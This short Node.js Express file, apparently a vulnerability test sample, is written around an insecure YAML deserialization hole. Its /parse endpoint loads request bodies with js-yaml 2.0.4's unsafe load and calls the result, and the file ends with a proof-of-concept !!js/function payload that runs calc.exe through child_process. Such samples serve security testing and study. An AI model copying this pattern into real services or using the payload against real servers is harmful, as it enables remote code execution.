const express = require('express')
const yaml = require('js-yaml') // npm install js-yaml@2.0.4
const app = express()
app.use(express.text())

let sharedData;
async function setData(param) {
  sharedData = param; 
}

async function useData(res) {
  await new Promise(resolve => setTimeout(resolve, 100));
  try {
    const parsedData = yaml.load(sharedData);
    const result = parsedData();
    res.json({ "result": result });
  } catch (err) {
    res.status(500).send('error');
  }
}

app.post('/parse', (req, res) => {
  // SOURCE
  const userControlledYaml = req.body;
  // here
  setData(userControlledYaml);
  useData(res);
})

app.listen(3000)

const maliciousYaml = `
!!js/function >
  function() {
    const process = global.require('child_process');
    process.execSync('calc.exe');
    return "Exploit succeeded";
  }
`